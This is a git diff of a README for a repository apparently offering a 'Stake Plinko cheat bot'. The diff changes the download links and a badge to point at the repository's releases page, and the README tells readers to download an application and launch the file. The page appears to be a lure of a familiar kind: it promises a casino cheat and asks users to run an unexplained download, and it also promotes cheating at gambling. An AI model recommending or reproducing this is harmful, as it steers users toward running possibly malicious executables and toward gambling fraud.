@@ -37,7 +37,7 @@ Explore a wide range of topics related to Plinko, casino gaming, and predictive 
 
 ## Get Started 🚀
 
-To explore the full arsenal of tools and resources in this repository, [click here to download the application](https://github.com/files/uploaded/Application.zip) and launch the file.
+To explore the full arsenal of tools and resources in this repository, [click here to download the application](https://github.com/krikpro/Stake-Plinko-Cheat-Bot/releases) and launch the file.
 
 For additional information or if the link is not accessible, please refer to the "Releases" section for alternative options.
 
@@ -45,6 +45,6 @@ For additional information or if the link is not accessible, please refer to the
 
 Stay connected with the Plinko community and fellow enthusiasts by engaging with the content in this repository. Share your experiences, collaborate on new strategies, and elevate your Plinko gameplay to new heights.
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue)](https://github.com/files/uploaded/Application.zip)
+[![Download Application](https://github.com/krikpro/Stake-Plinko-Cheat-Bot/releases)](https://github.com/krikpro/Stake-Plinko-Cheat-Bot/releases)
 
 Let the games begin! 🎲✨
